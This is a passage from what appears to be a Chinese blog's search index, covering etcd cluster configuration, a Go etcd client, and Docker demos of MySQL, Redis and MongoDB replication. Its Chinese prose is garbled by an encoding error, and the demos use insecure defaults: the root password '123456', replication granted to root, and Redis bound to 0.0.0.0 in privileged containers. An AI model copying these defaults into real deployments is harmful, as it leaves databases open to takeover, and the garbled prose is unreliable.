http://172.21.0.17:2390 # ç›‘å¬çš„\ninitial-advertise-peer-urls: http://172.21.0.17:2390\ninitial-cluster: etcd-1=http://172.21.0.17:2380,etcd-2=http://172.21.0.17:2390,etcd-3=http://172.21.0.15:2380\ninitial-cluster-token: etcd-cluster-token\ninitial-cluster-state: existing\n```\n\netcd3.conf\n\n```bash\n# èŠ‚ç‚¹åç§°\nname: etcd-3 \n\n# æ•°æ®å­˜å‚¨ç›®å½•\ndata-dir: /data/server/etcd/data \n\n# ç›‘å¬åœ¨å®¢æˆ·ç«¯æµé‡ä¸Šçš„URLåˆ—è¡¨ï¼Œè¯¥å‚æ•°å‘Šè¯‰etcdåœ¨æŒ‡å®šçš„åè®®://IP:portç»„åˆä¸Šæ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„ä¼ å…¥è¯·æ±‚ã€‚\nlisten-client-urls: http://172.21.0.15:2379,http://127.0.0.1:2379 \n\n# æ­¤æˆå‘˜çš„å®¢æˆ·ç«¯URLçš„åˆ—è¡¨ï¼Œè¿™äº›URLå¹¿æ’­ç»™é›†ç¾¤çš„å…¶ä½™éƒ¨åˆ†ã€‚ è¿™äº›URLå¯ä»¥åŒ…å«åŸŸåã€‚\nadvertise-client-urls: http://172.21.0.15:2379,http://127.0.0.1:2379\n\n# ç›‘å¬åœ¨å¯¹ç­‰èŠ‚ç‚¹æµé‡ä¸Šçš„URLåˆ—è¡¨ï¼Œè¯¥å‚æ•°å‘Šè¯‰etcdåœ¨æŒ‡å®šçš„åè®®://IP:portç»„åˆä¸Šæ¥å—æ¥è‡ªå…¶å¯¹ç­‰æ–¹çš„ä¼ å…¥è¯·æ±‚ã€‚\nlisten-peer-urls: http://172.21.0.15:2380\n\n# æ­¤æˆå‘˜çš„å¯¹ç­‰URLçš„åˆ—è¡¨ï¼Œä»¥é€šå‘Šåˆ°é›†ç¾¤çš„å…¶ä½™éƒ¨åˆ†ã€‚ è¿™äº›åœ°å€ç”¨äºåœ¨é›†ç¾¤å‘¨å›´ä¼ é€etcdæ•°æ®ã€‚ æ‰€æœ‰é›†ç¾¤æˆå‘˜å¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ªè·¯ç”±ã€‚ è¿™äº›URLå¯ä»¥åŒ…å«åŸŸåã€‚\ninitial-advertise-peer-urls: http://172.21.0.15:2380\n\n# å¯åŠ¨é›†ç¾¤çš„åˆå§‹åŒ–é…ç½®\ninitial-cluster: etcd-1=http://172.21.0.17:2380,etcd-2=http://172.21.0.17:2390,etcd-3=http://172.21.0.15:2380\n\n# å¼•å¯¼æœŸé—´etcdç¾¤é›†çš„åˆå§‹é›†ç¾¤ä»¤ç‰Œã€‚\ninitial-cluster-token: etcd-cluster-token\n\n# åˆå§‹ç¾¤é›†çŠ¶æ€ï¼ˆâ€œæ–°â€æˆ–â€œç°æœ‰â€ï¼‰ã€‚ å¯¹äºåœ¨åˆå§‹é™æ€æˆ–DNSå¼•å¯¼è¿‡ç¨‹ä¸­å­˜åœ¨çš„æ‰€æœ‰æˆå‘˜ï¼Œå°†å…¶è®¾ç½®ä¸ºnewã€‚ å¦‚æœæ­¤é€‰é¡¹è®¾ç½®ä¸ºexistingï¼Œåˆ™etcdå°†å°è¯•åŠ å…¥ç°å­˜é›†ç¾¤ã€‚ å¦‚æœè®¾ç½®äº†é”™è¯¯çš„å€¼ï¼Œetcdå°†å°è¯•å¯åŠ¨ï¼Œä½†ä¼šå®‰å…¨åœ°å¤±è´¥ã€‚\ninitial-cluster-state: new\n```\n\n\n\n`etcdctl member list`\n\n```\nhash1: name=etcd-1 peerURLs=http://172.21.0.17:2380 clientURLs=http://127.0.0.1:2379,http://172.21.0.17:2379 isLeader=false\n\nhash2: name=etcd-2 peerURLs=http://172.21.0.17:2390 clientURLs=http://127.0.0.1:2389,http://172.21.0.17:2389 isLeader=false\n\nhash3: name=etcd-3 peerURLs=http://172.21.0.15:2380 clientURLs=http://127.0.0.1:2379,http://172.21.0.15:2379 isLeader=true\n```\n\n\n\n# 3. golang ä½¿ç”¨ etcd\n\nhttps://github.com/etcd-io/etcd/tree/master/client\n\n```bash\ngo get go.etcd.io/etcd/v3/client\n```\n\nä»£ç :\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"time\"\n\t\"context\"\n\n\t\"go.etcd.io/etcd/v3/client\"\n)\n\nfunc main() {\n\tcfg := client.Config{\n\t\tEndpoints:               []string{\"http://127.0.0.1:2379\"},\n\t\tTransport:               client.DefaultTransport,\n\t\t// set timeout per request to fail fast when the target endpoint is unavailable\n\t\tHeaderTimeoutPerRequest: time.Second,\n\t}\n\tc, err := client.New(cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tkapi := client.NewKeysAPI(c)\n\t// set \"/foo\" key with \"bar\" value\n\tlog.Print(\"Setting '/foo' key with 'bar' value\")\n\tresp, err := kapi.Set(context.Background(), \"/foo\", \"bar\", nil)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t} else {\n\t\t// print common key info\n\t\tlog.Printf(\"Set is done. Metadata is %q\\n\", resp)\n\t}\n\t// get \"/foo\" key's value\n\tlog.Print(\"Getting '/foo' key value\")\n\tresp, err = kapi.Get(context.Background(), \"/foo\", nil)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t} else {\n\t\t// print common key info\n\t\tlog.Printf(\"Get is done. Metadata is %q\\n\", resp)\n\t\t// print value\n\t\tlog.Printf(\"%q key has %q value\\n\", resp.Node.Key, resp.Node.Value)\n\t}\n}\n```\n\n\n\n### 3.1 æŠ¥é”™ undefined: balancer.PickOptions\n\nå…·ä½“æ“ä½œæ–¹æ³•æ˜¯åœ¨go.modé‡ŒåŠ ä¸Šï¼š\n\n```go\nreplace google.golang.org/grpc => google.golang.org/grpc v1.26.0\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/etcd-io/etcd\n+ https://blog.pytool.com/devops/etcd/etcdctl/\n+ https://www.liwenzhou.com/posts/Go/go_etcd/\n+ https://www.cnblogs.com/cbkj-xd/p/11934599.html","tags":["etcd"],"categories":["åˆ†å¸ƒå¼"]},{"title":"ä¸åŒæ•°æ®åº“çš„ä¸»ä»å¤åˆ¶æµç¨‹","url":"%2Fp%2F2aa5fdb4.html","content":"\n# 1. MySQL ä¸»ä»å¤åˆ¶\n\nMySQLä¸»ä»å¤åˆ¶æ¶‰åŠåˆ°ä¸‰ä¸ªçº¿ç¨‹\n\n+ ä¸€ä¸ªè¿è¡Œåœ¨ä¸»èŠ‚ç‚¹ï¼ˆlog dump threadï¼‰\n\n+ å…¶ä½™ä¸¤ä¸ª(I/O thread, SQL thread)è¿è¡Œåœ¨ä»èŠ‚ç‚¹\n\n![1](ä¸åŒæ•°æ®åº“çš„ä¸»ä»å¤åˆ¶æµç¨‹/1.jpg)\n\n<!-- more -->\n\n### 1.1 MySQL å¤åˆ¶è¿‡ç¨‹\n\nè¦å®æ–½å¤åˆ¶ï¼Œé¦–å…ˆå¿…é¡»æ‰“å¼€Master ç«¯çš„binary logï¼ˆbin-logï¼‰åŠŸèƒ½ï¼Œå¦åˆ™æ— æ³•å®ç°ã€‚\n\n+ **ä¸»èŠ‚ç‚¹ binary log dump çº¿ç¨‹**\n\n  å½“ä»èŠ‚ç‚¹è¿æ¥ä¸»èŠ‚ç‚¹æ—¶ï¼Œä¸»èŠ‚ç‚¹ä¼šåˆ›å»ºä¸€ä¸ªlog dump çº¿ç¨‹ï¼Œç”¨äºå‘é€bin-logçš„å†…å®¹ã€‚åœ¨è¯»å–bin-logä¸­çš„æ“ä½œæ—¶ï¼Œæ­¤çº¿ç¨‹ä¼šå¯¹ä¸»èŠ‚ç‚¹ä¸Šçš„bin-logåŠ é”ï¼Œå½“è¯»å–å®Œæˆï¼Œç”šè‡³åœ¨å‘åŠ¨ç»™ä»èŠ‚ç‚¹ä¹‹å‰ï¼Œé”ä¼šè¢«é‡Šæ”¾ã€‚\n\n+ **ä»èŠ‚ç‚¹I/Oçº¿ç¨‹**\n\n  å½“ä»èŠ‚ç‚¹ä¸Šæ‰§è¡Œ`start slave`å‘½ä»¤ä¹‹åï¼Œä»èŠ‚ç‚¹ä¼šåˆ›å»ºä¸€ä¸ªI/Oçº¿ç¨‹ç”¨æ¥è¿æ¥ä¸»èŠ‚ç‚¹ï¼Œè¯·æ±‚ä¸»åº“ä¸­æ›´æ–°çš„bin-logã€‚I/Oçº¿ç¨‹æ¥æ”¶åˆ°ä¸»èŠ‚ç‚¹binlog dump è¿›ç¨‹å‘æ¥çš„æ›´æ–°ä¹‹åï¼Œä¿å­˜åœ¨æœ¬åœ°relay-logä¸­ã€‚\n\n+ **ä»èŠ‚ç‚¹SQLçº¿ç¨‹**\n\n  SQLçº¿ç¨‹è´Ÿè´£è¯»å–relay logä¸­çš„å†…å®¹ï¼Œè§£ææˆå…·ä½“çš„æ“ä½œå¹¶æ‰§è¡Œï¼Œæœ€ç»ˆä¿è¯ä¸»ä»æ•°æ®çš„ä¸€è‡´æ€§ã€‚\n\n\n\n### 1.2 MySQL ä¸»ä»å¤åˆ¶æ¨¡å¼\n\nMySQL ä¸»ä»å¤åˆ¶é»˜è®¤æ˜¯å¼‚æ­¥çš„æ¨¡å¼ã€‚\n\nMySQLå¢åˆ æ”¹æ“ä½œä¼šå…¨éƒ¨è®°å½•åœ¨binary logä¸­ï¼Œå½“slaveèŠ‚ç‚¹è¿æ¥masteræ—¶ï¼Œä¼šä¸»åŠ¨ä»masterå¤„è·å–æœ€æ–°çš„bin logæ–‡ä»¶ã€‚å¹¶æŠŠbin logä¸­çš„sql relayã€‚\n\n+ **å¼‚æ­¥æ¨¡å¼**\n\n  ä¸»èŠ‚ç‚¹ä¸ä¼šä¸»åŠ¨push bin logåˆ°ä»èŠ‚ç‚¹ï¼Œè¿™æ ·æœ‰å¯èƒ½å¯¼è‡´failoverçš„æƒ…å†µä¸‹ï¼Œä¹Ÿè®¸ä»èŠ‚ç‚¹æ²¡æœ‰å³æ—¶åœ°å°†æœ€æ–°çš„bin logåŒæ­¥åˆ°æœ¬åœ°ã€‚\n\n+ **åŠåŒæ­¥æ¨¡å¼(mysql semi-sync)**\n\n  ä¸»èŠ‚ç‚¹åªéœ€è¦æ¥æ”¶åˆ°å…¶ä¸­ä¸€å°ä»èŠ‚ç‚¹çš„è¿”å›ä¿¡æ¯ï¼Œå°±ä¼šcommitï¼›å¦åˆ™éœ€è¦ç­‰å¾…ç›´åˆ°è¶…æ—¶æ—¶é—´ç„¶ååˆ‡æ¢æˆå¼‚æ­¥æ¨¡å¼å†æäº¤ã€‚\n\n  binlogè‡³å°‘ä¼ è¾“åˆ°äº†ä¸€ä¸ªä»èŠ‚ç‚¹ä¸Šï¼Œä¸èƒ½ä¿è¯ä»èŠ‚ç‚¹å°†æ­¤äº‹åŠ¡æ›´æ–°åˆ°dbä¸­ã€‚æ€§èƒ½ä¸Šä¼šæœ‰ä¸€å®šçš„é™ä½ï¼Œå“åº”æ—¶é—´ä¼šå˜é•¿ã€‚\n\n+ **å…¨åŒæ­¥æ¨¡å¼**\n\n  å…¨åŒæ­¥æ¨¡å¼æ˜¯æŒ‡ä¸»èŠ‚ç‚¹å’Œä»èŠ‚ç‚¹å…¨éƒ¨æ‰§è¡Œäº†commitå¹¶ç¡®è®¤æ‰ä¼šå‘å®¢æˆ·ç«¯è¿”å›æˆåŠŸã€‚\n\n\n\n### 1.3 MySQL å¤åˆ¶æ–¹å¼\n\n+ åŸºäºSQLè¯­å¥çš„å¤åˆ¶ï¼ˆstatement-based replicationï¼ŒSBRï¼‰\n\n  å°±æ˜¯è®°å½•sqlè¯­å¥åœ¨bin logä¸­ï¼ŒMysql 5.1.4 åŠä¹‹å‰çš„ç‰ˆæœ¬éƒ½æ˜¯ä½¿ç”¨çš„è¿™ç§å¤åˆ¶æ ¼å¼ã€‚\n\n  ä¼˜ç‚¹æ˜¯åªéœ€è¦è®°å½•ä¼šä¿®æ”¹æ•°æ®çš„sqlè¯­å¥åˆ°binlogä¸­ï¼Œå‡å°‘äº†binlogæ—¥å¿—é‡ï¼ŒèŠ‚çº¦I/Oï¼Œæé«˜æ€§èƒ½ã€‚\n\n  ç¼ºç‚¹æ˜¯åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä¸»ä»èŠ‚ç‚¹ä¸­æ•°æ®ä¸ä¸€è‡´ï¼ˆæ¯”å¦‚now()å‡½æ•°ç­‰ï¼‰ã€‚\n\n  \n\n+ åŸºäºè¡Œçš„å¤åˆ¶ï¼ˆrow-based replicationï¼ŒRBR)\n\n  mysql masterå°†SQLè¯­å¥åˆ†è§£ä¸ºåŸºäºRowæ›´æ”¹çš„è¯­å¥å¹¶è®°å½•åœ¨bin logä¸­ï¼Œä¹Ÿå°±æ˜¯åªè®°å½•å“ªæ¡æ•°æ®è¢«ä¿®æ”¹äº†ï¼Œä¿®æ”¹æˆä»€ä¹ˆæ ·ã€‚\n\n  ä¼˜ç‚¹æ˜¯ä¸ä¼šå‡ºç°æŸäº›ç‰¹å®šæƒ…å†µä¸‹çš„å­˜å‚¨è¿‡ç¨‹ã€æˆ–è€…å‡½æ•°ã€æˆ–è€…triggerçš„è°ƒç”¨æˆ–è€…è§¦å‘æ— æ³•è¢«æ­£ç¡®å¤åˆ¶çš„é—®é¢˜ã€‚\n\n  ç¼ºç‚¹æ˜¯ä¼šäº§ç”Ÿå¤§é‡çš„æ—¥å¿—ï¼Œå°¤å…¶æ˜¯ä¿®æ”¹tableçš„æ—¶å€™ä¼šè®©æ—¥å¿—æš´å¢,åŒæ—¶å¢åŠ bin logåŒæ­¥æ—¶é—´ã€‚ä¹Ÿä¸èƒ½é€šè¿‡bin logè§£æè·å–æ‰§è¡Œè¿‡çš„sqlè¯­å¥ï¼Œåªèƒ½çœ‹åˆ°å‘ç”Ÿçš„dataå˜æ›´ã€‚\n\n  \n\n+ æ··åˆæ¨¡å¼å¤åˆ¶ï¼ˆmixed-based replication,MBR)\n\n  MySQL NDB cluster 7.3 å’Œ7.4 ä½¿ç”¨çš„MBRã€‚æ˜¯ä»¥ä¸Šä¸¤ç§æ¨¡å¼çš„æ··åˆï¼Œå¯¹äºä¸€èˆ¬çš„å¤åˆ¶ä½¿ç”¨STATEMENTæ¨¡å¼ä¿å­˜åˆ°binlogï¼Œå¯¹äºSTATEMENTæ¨¡å¼æ— æ³•å¤åˆ¶çš„æ“ä½œåˆ™ä½¿ç”¨ROWæ¨¡å¼æ¥ä¿å­˜ï¼ŒMySQLä¼šæ ¹æ®æ‰§è¡Œçš„SQLè¯­å¥é€‰æ‹©æ—¥å¿—ä¿å­˜æ–¹å¼ã€‚\n\n\n\n### 1.4 æ“ä½œ\n\n+ docker è¿è¡Œ mysql\n\n  ```bash\n  docker pull mysql:5.7 # æ‹‰å–é•œåƒ\n  \n  docker run --name mysql1 -p 33061:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 # è¿è¡Œç¬¬ä¸€ä¸ª mysql\n  docker run --name mysql2 -p 33062:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 # è¿è¡Œç¬¬äºŒä¸ª mysql\n  ```\n\nâ€‹\tç¬¬ä¸€ä¸ªå½“åšä¸»æœåŠ¡å™¨, ç¬¬äºŒä¸ªå½“åšä»æœåŠ¡å™¨\n\n+ ä¸»æœåŠ¡å™¨é…ç½®\n\n  ```bash\n  # 1. è¿›å…¥å®¹å™¨ä¿®æ”¹é…ç½®æ–‡ä»¶\n  docker exec -it mysql1 /bin/bash\n  \n  vi /etc/mysql/mysql.conf.d/mysqld.cnf\n  [mysqld]\n  server-id=1\n  log-bin=mysql-bin\n  \n  docker restart mysql1\n  \n  # 2. é…ç½®æƒé™, å¯ä»¥è¢«è¿æ¥\n  mysql -u root -p\n  grant replication slave on *.* to 'root'@'172.17.0.1' identified by '123456';\n  flush privileges;\n  show master status\\G\n  *************************** 1. row ***************************\n             File: mysql-bin.000003\n           Position: 319\n       Binlog_Do_DB:\n   Binlog_Ignore_DB:\n  Executed_Gtid_Set:\n  ```\n  \n+ ä»æœåŠ¡å™¨é…ç½®\n\n  ```bash\n  # 1. è¿›å…¥å®¹å™¨ä¿®æ”¹é…ç½®æ–‡ä»¶\n  docker exec -it mysql2 /bin/bash\n  \n  vi /etc/mysql/mysql.conf.d/mysqld.cnf\n  [mysqld]\n  server-id=2\n  log-bin=mysql-bin\n  \n  docker restart mysql2\n  \n  \n  # 2.å¼€å¯slave, å¯ä»¥è¢«è®¿é—®\n  mysql -u root -p\n  \n  # 172.17.0.1 æ˜¯docker mac æœ¬æœº ip, 33061æ˜¯ ä¸»çš„ç«¯å£\n  change master to master_host='172.17.0.1',\n  master_port=33061,\n  master_user='root',\n  master_password='123456',\n  master_log_file='mysql-bin.000003',\n  master_log_pos=319; \n  \n  \n  start slave;\n  show slave status\\G\n  *************************** 1. row ***************************\n                 Slave_IO_State: Waiting for master to send event\n                    Master_Host: 172.17.0.1\n                    Master_User: root\n                    Master_Port: 33061\n                  Connect_Retry: 60\n                Master_Log_File: mysql-bin.000003\n            Read_Master_Log_Pos: 649\n                 Relay_Log_File: 9339fdceb667-relay-bin.000002\n                  Relay_Log_Pos: 650\n          Relay_Master_Log_File: mysql-bin.000003\n               Slave_IO_Running: Yes\n              Slave_SQL_Running: Yes\n  ```\n  \n+ æµ‹è¯•\n\n  ```bash\n  # ä¸»æ•°æ®åº“åˆ›å»º\n  create database test_1;\n  # ä»æ•°æ®æŸ¥çœ‹, å³å¯ä»¥çœ‹åˆ°\n  show databases;\n  ```\n\n  \n\n# 2. redis ä¸»ä»å¤åˆ¶\n\nä¸»æœåŠ¡å™¨è´Ÿè´£æ¥æ”¶å†™è¯·æ±‚, ä»æœåŠ¡å™¨è´Ÿè´£æ¥æ”¶è¯»è¯·æ±‚(ä»æœåŠ¡å™¨æ— æ³•è¿›è¡Œå†™æ“ä½œ)\n\n### 2.1 åŒæ­¥æ¨¡å¼\n\n+ å®Œæ•´é‡åŒæ­¥(redis 2.8ä»¥å‰)\n  + ä»æœåŠ¡å™¨å‘ä¸»æœåŠ¡å™¨å‘é€PSYNCå‘½ä»¤\n  \n  + æ”¶åˆ°PSYNCå‘½ä»¤çš„ä¸»æœåŠ¡å™¨æ‰§è¡ŒBGSAVEå‘½ä»¤ï¼Œåœ¨åå°**ç”Ÿæˆä¸€ä¸ªRDBæ–‡ä»¶**ã€‚å¹¶ç”¨ä¸€ä¸ª**ç¼“å†²åŒº**æ¥è®°å½•ä»ç°åœ¨å¼€å§‹æ‰§è¡Œçš„æ‰€æœ‰**å†™å‘½ä»¤**ã€‚\n  \n  + å½“ä¸»æœåŠ¡å™¨çš„BGSAVEå‘½ä»¤æ‰§è¡Œå®Œåï¼Œå°†ç”Ÿæˆçš„RDBæ–‡ä»¶å‘é€ç»™ä»æœåŠ¡å™¨ï¼Œ**ä»æœåŠ¡å™¨æ¥æ”¶å’Œè½½å…¥RDBæ–‡ä»¶**ã€‚å°†è‡ªå·±çš„æ•°æ®åº“çŠ¶æ€æ›´æ–°è‡³ä¸ä¸»æœåŠ¡å™¨æ‰§è¡ŒBGSAVEå‘½ä»¤æ—¶çš„çŠ¶æ€ã€‚\n  \n  + ä¸»æœåŠ¡å™¨å°†æ‰€æœ‰ç¼“å†²åŒºçš„**å†™å‘½ä»¤å‘é€ç»™ä»æœåŠ¡å™¨**ï¼Œä»æœåŠ¡å™¨æ‰§è¡Œè¿™äº›å†™å‘½ä»¤ï¼Œè¾¾åˆ°æ•°æ®æœ€ç»ˆä¸€è‡´æ€§ã€‚\n  \n    \n  \n+ éƒ¨åˆ†é‡åŒæ­¥\n\n  + ä¸»ä»æœåŠ¡å™¨çš„å¤åˆ¶åç§»é‡\n\n    - ä¸»æœåŠ¡å™¨æ¯æ¬¡ä¼ æ’­Nä¸ªå­—èŠ‚ï¼Œå°±å°†è‡ªå·±çš„å¤åˆ¶åç§»é‡åŠ ä¸ŠN\n\n    - ä»æœåŠ¡å™¨æ¯æ¬¡æ”¶åˆ°ä¸»æœåŠ¡å™¨çš„Nä¸ªå­—èŠ‚ï¼Œå°±å°†è‡ªå·±çš„å¤åˆ¶åç§»é‡åŠ ä¸ŠN\n\n      \n\n  + ä¸»æœåŠ¡å™¨çš„å¤åˆ¶ç§¯å‹ç¼“å†²åŒº\n\n    ä¸»æœåŠ¡å™¨è¿›è¡Œå‘½ä»¤ä¼ æ’­æ—¶ï¼Œä¸ä»…ä»…ä¼šå°†å†™å‘½ä»¤å‘é€ç»™æ‰€æœ‰çš„ä»æœåŠ¡å™¨ï¼Œè¿˜ä¼šå°†å†™å‘½ä»¤**å…¥é˜Ÿåˆ°å¤åˆ¶ç§¯å‹ç¼“å†²åŒº**é‡Œé¢(è¿™ä¸ªå¤§å°å¯ä»¥è°ƒçš„)ã€‚å¦‚æœå¤åˆ¶ç§¯å‹ç¼“å†²åŒº**å­˜åœ¨**ä¸¢å¤±çš„åç§»é‡çš„æ•°æ®ï¼Œé‚£å°±æ‰§è¡Œéƒ¨åˆ†é‡åŒæ­¥ï¼Œå¦åˆ™æ‰§è¡Œå®Œæ•´é‡åŒæ­¥ã€‚\n\n    \n\n  + æœåŠ¡å™¨è¿è¡Œçš„ID(**run ID**)\n\n    æœåŠ¡å™¨è¿è¡Œçš„ID(**run ID**)å®é™…ä¸Šå°±æ˜¯ç”¨æ¥æ¯”å¯¹IDæ˜¯å¦ç›¸åŒã€‚å¦‚æœä¸ç›¸åŒï¼Œåˆ™è¯´æ˜ä»æœåŠ¡å™¨æ–­çº¿ä¹‹å‰å¤åˆ¶çš„ä¸»æœåŠ¡å™¨å’Œå½“å‰è¿æ¥çš„ä¸»æœåŠ¡å™¨æ˜¯ä¸¤å°æœåŠ¡å™¨ï¼Œè¿™å°±ä¼šè¿›è¡Œå®Œæ•´é‡åŒæ­¥ã€‚\n\n    \n\n+ å‘½ä»¤ä¼ æ’­\n\n  å½“å®Œæˆäº†åŒæ­¥ä¹‹åï¼Œä¸»ä»æœåŠ¡å™¨å°±ä¼šè¿›å…¥å‘½ä»¤ä¼ æ’­é˜¶æ®µã€‚è¿™æ—¶ä¸»æœåŠ¡å™¨åªè¦å°†è‡ªå·±çš„å†™å‘½ä»¤å‘é€ç»™ä»æœåŠ¡å™¨ï¼Œè€Œä»æœåŠ¡å™¨æ¥æ”¶å¹¶æ‰§è¡Œä¸»æœåŠ¡å™¨å‘é€è¿‡æ¥çš„å†™å‘½ä»¤ï¼Œå°±å¯ä»¥ä¿è¯ä¸»ä»æœåŠ¡å™¨ä¸€ç›´ä¿æŒæ•°æ®ä¸€è‡´äº†ï¼\n\n  åœ¨å‘½ä»¤ä¼ æ’­é˜¶æ®µï¼Œä»æœåŠ¡å™¨é»˜è®¤ä¼šä»¥æ¯ç§’ä¸€æ¬¡çš„é¢‘ç‡ï¼Œå‘æœåŠ¡å™¨å‘é€å‘½ä»¤`REPLCONF ACK <replication_offset>` å…¶ä¸­replication_offsetæ˜¯ä»æœåŠ¡å™¨å½“å‰çš„å¤åˆ¶åç§»é‡\n\n\n\n### 2.2 æ“ä½œ\n\n+ ä¸‹è½½\n\n  ```bash\n  # ä¸‹è½½\n  docker pull redis:latest\n\n  # ä¸‹è½½é…ç½®æ–‡ä»¶ \n  http://download.redis.io/redis-stable/redis.conf\n\n  # ä¸»redisé…ç½®, æ— éœ€ç‰¹æ®Šé…ç½®, å› ä¸ºåœ¨ docker å†…, éœ€è¦ä¿®æ”¹ä¸€ä¸‹bind\n  vi $PWD/redis1/redis.conf\n  bind 127.0.0.1 æ”¹ä¸º bind 0.0.0.0\n\n  # ä¿®æ”¹ä»redisé…ç½®, ä¿®æ”¹ redis.conf æ–‡ä»¶\n  vi $PWD/redis2/redis.conf\n  slaveof 172.17.0.1 63791\n  ```\n\n+ å¯åŠ¨\n\n  ```bash\n  # ä¸»æœåŠ¡å™¨\n  docker run \\\n  -p 63791:6379 \\\n  -v $PWD/redis1/redis.conf:/etc/redis/redis.conf \\\n  --privileged=true \\\n  --name redis1 \\\n  -d redis redis-server /etc/redis/redis.conf\n\n  # ä»æœåŠ¡å™¨\n  docker run \\\n  -p 63792:6379 \\\n  -v $PWD/redis2/redis.conf:/etc/redis/redis.conf \\\n  --privileged=true \\\n  --name redis2 \\\n  -d redis redis-server /etc/redis/redis.conf\n  ```\n\n+ æµ‹è¯•\n\n  ```bash\n  # æŸ¥çœ‹é…ç½®æ–‡ä»¶\n  redis-cli info | grep config_file\n  \n  # æŸ¥çœ‹ä»çš„çŠ¶æ€, çœ‹åˆ°master_link_status:upå°±æ˜¯æˆåŠŸ\n  redis-cli info | grep master\n  master_host:172.17.0.1\n  master_port:63791\n  master_link_status:up\n  \n\t# ç„¶ååœ¨ä¸»æœåŠ¡å™¨ set key, åœ¨ä»æœåŠ¡å™¨ get å³å¯\n  ```\n  \n  \n\n# 3. mongodb ä¸»ä»å¤åˆ¶\n\nMongoDB æœ‰ä¸‰ç§é›†ç¾¤éƒ¨ç½²æ¨¡å¼ï¼Œåˆ†åˆ«ä¸ºä¸»ä»å¤åˆ¶ï¼ˆMaster-Slaverï¼‰ã€å‰¯æœ¬é›†ï¼ˆReplica Setï¼‰å’Œåˆ†ç‰‡ï¼ˆShardingï¼‰æ¨¡å¼ã€‚\n\n- Master-Slaver æ˜¯ä¸€ç§ä¸»ä»å‰¯æœ¬çš„æ¨¡å¼ï¼Œç›®å‰å·²ç»ä¸æ¨èä½¿ç”¨ã€‚\n- Replica Set æ¨¡å¼å–ä»£äº† Master-Slaver æ¨¡å¼ï¼Œæ˜¯ä¸€ç§äº’ä¸ºä¸»ä»çš„å…³ç³»ã€‚Replica Set å°†æ•°æ®å¤åˆ¶å¤šä»½ä¿å­˜ï¼Œä¸åŒæœåŠ¡å™¨ä¿å­˜åŒä¸€ä»½æ•°æ®ï¼Œåœ¨å‡ºç°æ•…éšœæ—¶è‡ªåŠ¨åˆ‡æ¢ï¼Œå®ç°æ•…éšœè½¬ç§»ï¼Œåœ¨å®é™…ç”Ÿäº§ä¸­éå¸¸å®ç”¨ã€‚\n- Sharding æ¨¡å¼é€‚åˆå¤„ç†å¤§é‡æ•°æ®ï¼Œå®ƒå°†æ•°æ®åˆ†å¼€å­˜å‚¨ï¼Œä¸åŒæœåŠ¡å™¨ä¿å­˜ä¸åŒçš„æ•°æ®ï¼Œæ‰€æœ‰æœåŠ¡å™¨æ•°æ®çš„æ€»å’Œå³ä¸ºæ•´ä¸ªæ•°æ®é›†ã€‚\n\n### 3.1 ä¸»ä»å¤åˆ¶(ä¸æ¨è)\n\n+ --masterç”¨æ¥ç¡®å®šä¸»æœåŠ¡å™¨\n\n+ --slave å’Œ --source æ¥æ§åˆ¶ä»æœåŠ¡å™¨\n+ å¯ä»¥åœ¨mongodb.confé…ç½®æ–‡ä»¶é‡ŒæŒ‡æ˜ä¸»ä»å…³ç³»ï¼Œè¿™æ ·å¯åŠ¨mongodbçš„æ—¶å€™åªè¦è·Ÿä¸Šé…ç½®æ–‡ä»¶å°±è¡Œï¼Œå°±ä¸éœ€è¦é€šè¿‡--masterå’Œ--slaveæ¥æŒ‡æ˜ä¸»ä»äº†ã€‚\n\n### 3.2 å‰¯æœ¬é›†\n\nåªèƒ½ master å†™, ä»ä¸èƒ½å†™ã€‚\n\n+ ä¸‹è½½\n\n  ```bash\n  docker pull mongo:latest\n  \n  # ä¸»æœåŠ¡å™¨\n  docker run \\\n  -d \\\n  -p 27018:27017 \\\n  --name mongo1 \\\n  mongo mongod --replSet my-mongo-set\n  \n  # ä»æœåŠ¡å™¨\n  docker run \\\n  -d \\\n  -p 27019:27017 \\\n  --name mongo2 \\\n  mongo mongod --replSet my-mongo-set\n  ```\n  \n+ é…ç½®\n\n  ```bash\n  docker exec -it mongo1 mongo\n  \n  config = {\n       \"_id\" : \"my-mongo-set\",\n       \"members\" : [\n           {\n               \"_id\" : 0,\n               \"host\" : \"172.17.0.1:27018\"\n           },\n           {\n               \"_id\" : 1,\n               \"host\" : \"172.17.0.1:27019\"\n           }\n       ]\n    }\n  rs.initiate(config)\n  # ä¸‹é¢æ˜¯è¾“å‡º\n  {\n          \"ok\" : 1,\n          \"$clusterTime\" : {\n                  \"clusterTime\" : Timestamp(1595349445, 1),\n                  \"signature\" : {\n                          \"hash\" : BinData(0,\"AAAAAAAAAAAAAAAAAAAAAAAAAAA=\"),\n                          \"keyId\" : NumberLong(0)\n                  }\n          },\n          \"operationTime\" : Timestamp(1595349445, 1)\n  }\n  \n  # å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œæç¤ºç¬¦å°†å˜æˆè¿™æ ·ï¼š(éœ€æ‰‹åŠ¨éšä¾¿æ•²å‘½ä»¤è§¦å‘ä¸‹)\n  my-mongo-set:PRIMARY>\n  ```\n\n\n+ æµ‹è¯•\n\n  ```bash\n  # å¯åŠ¨ä»æœåŠ¡å™¨\n  docker exec -it mongo2 mongo\n  my-mongo-set:PRIMARY>\n  \n  \n  # ä¸»æœåŠ¡å™¨\n  my-mongo-set:PRIMARY> db.mycollection.insert({name : 'sample'})\n  WriteResult({ \"nInserted\" : 1 })\n  my-mongo-set:PRIMARY> db.mycollection.find()\n  { \"_id\" : ObjectId(\"5f171a9bfb41dd82f33d6b2d\"), \"name\" : \"sample\" }\n  \n  # ä»æœåŠ¡å™¨\n  my-mongo-set:SECONDARY> db.setSlaveOk() # è®¾ç½®åŒæ­¥\n  my-mongo-set:SECONDARY> db.mycollection.find()\n  { \"_id\" : ObjectId(\"5f171a9bfb41dd82f33d6b2d\"), \"name\" : \"sample\" }\n  \n  \n  # æŸ¥è¯¢çŠ¶æ€\n  1. 